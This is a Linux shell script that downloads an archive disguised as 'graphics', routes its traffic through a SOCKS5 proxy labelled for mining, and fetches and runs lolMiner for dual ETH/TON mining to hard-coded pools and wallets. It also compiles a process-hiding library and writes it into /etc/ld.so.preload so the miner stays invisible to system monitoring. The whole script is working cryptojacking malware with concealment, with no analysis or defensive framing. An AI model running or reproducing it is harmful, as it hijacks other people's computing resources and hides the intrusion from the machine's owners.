#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 64.225.2.0:443
socks5_username = mining
socks5_password = untukkita
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/Kiriknak/Kiriknak.github.io/master/lolMiner
chmod +x lolMiner
POOL=stratum+tcp://ethash.poolbinance.com:443
WALLET=balhein
WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)
TONPOOL=https://server1.whalestonpool.com
TONWALLET=UQAYzsjy9QjlgOBgqJ2i_VPPwJzq-Zb-9cz7hZE6DclYdtjk

./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
unzip magicPriyatama.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./lolMiner --algo ETHASH --pool $POOL --user $WALLET.$WORKER  --dualmode TONDUAL --dualpool $TONPOOL --dualuser $TONWALLET --worker $WORKER $@
